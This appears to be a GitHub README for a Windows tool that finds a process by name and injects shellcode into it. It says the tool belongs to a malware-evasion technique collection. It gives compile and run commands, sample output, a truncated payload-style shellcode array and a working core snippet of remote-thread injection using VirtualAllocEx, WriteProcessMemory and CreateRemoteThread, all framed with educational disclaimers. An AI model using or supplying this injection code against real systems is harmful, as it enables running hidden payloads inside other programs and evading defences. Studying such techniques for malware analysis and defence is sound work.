
# Process Scanner & Shellcode Injector


<a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&pause=1000&width=435&lines=This+is+the+application+of+the+technique;RemoteProcessScanner;It+Was+added+in;the+MalwareEvasionTechniques" alt="Typing SVG" /></a>

A powerful Windows tool that scans for a specific process by its name and injects shellcode into it. This tool is primarily designed for educational and malware analysis purposes, demonstrating how process injection works in Windows environments.

**Note**: This tool is intended for use in controlled environments, such as malware research, pentesting, or debugging. It should not be used for malicious purposes.

## Features

- Scans through all running processes on the system.
- Locates a target process by name.
- Injects shellcode into the target process if found.
- Provides feedback and logging throughout the injection process.

## Prerequisites

- **Operating System**: Windows (with administrator privileges)
- **Compiler**: MinGW or Visual Studio (MSVC)
- **Windows SDK**: Required for process enumeration and memory allocation APIs.
- **Knowledge**: Understanding of how process injection works and familiarity with shellcode.

## How It Works

The tool uses the `CreateToolhelp32Snapshot` Windows API to take a snapshot of all running processes. It compares each process name with the target name provided by the user. If a match is found, it opens the process, allocates memory, writes the provided shellcode, and finally creates a thread to execute the shellcode in the context of the target process.

### Injection Workflow:

1. **Process Scanning**: Scans all running processes and identifies the target based on the user-provided process name.
2. **Process Opening**: Opens the target process with `PROCESS_ALL_ACCESS` permissions.
3. **Memory Allocation**: Allocates executable memory inside the target process.
4. **Shellcode Injection**: Writes the shellcode into the allocated memory.
5. **Remote Thread Creation**: Creates a new thread in the target process to execute the shellcode.

## Usage

### Clone the repository:
```bash
git clone https://github.com/your-username/process-scanner-shellcode-injector.git
cd process-scanner-shellcode-injector
```

### Compile the Program:

Using MinGW (`gcc`):
```bash
gcc -o scanner_injector.exe scanner_injector.c -lkernel32 -luser32
```

Using Visual Studio:
- Open the solution in Visual Studio.
- Build the solution (Ctrl + Shift + B).

### Run the Program:
```bash
scanner_injector.exe <ProcessName>
```

Example:
```bash
scanner_injector.exe notepad.exe
```

**Output:**
```bash
Great! We found the process: notepad.exe with PID: 1234
Allocated 512-bytes with PAGE_EXECUTE_READWRITE permissions inside PID 1234
Wrote 512-bytes to process memory
We got a handle on the Thread with ID 5678
```

### Example Shellcode

The program contains example shellcode, defined as `R0m4InShell[]`, which could be modified based on your specific use case. Ensure that the shellcode you inject is appropriate for testing purposes.

```c
unsigned char R0m4InShell[] = {
    "\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
    // ... truncated for brevity
};
```

## Code Overview

The following snippet outlines the core part of the process scanning and shellcode injection:

```c
HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
Proc.dwSize = sizeof(PROCESSENTRY32);
if (Process32First(hSnapshot, &Proc)) {
    do {
        if (wcscmp(Proc.szExeFile, target) == 0) {
            PID = Proc.th32ProcessID;
            break;
        }
    } while (Process32Next(hSnapshot, &Proc));
}
hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(R0m4InShell), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProcess, rBuffer, R0m4InShell, sizeof(R0m4InShell), NULL);
hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, &TID);
```

## Disclaimer

This tool is for educational purposes only. Misuse of this tool can result in criminal charges. The developer is not responsible for any damage caused by the misuse of this tool. Always have permission to test and inject into processes, especially in production environments.
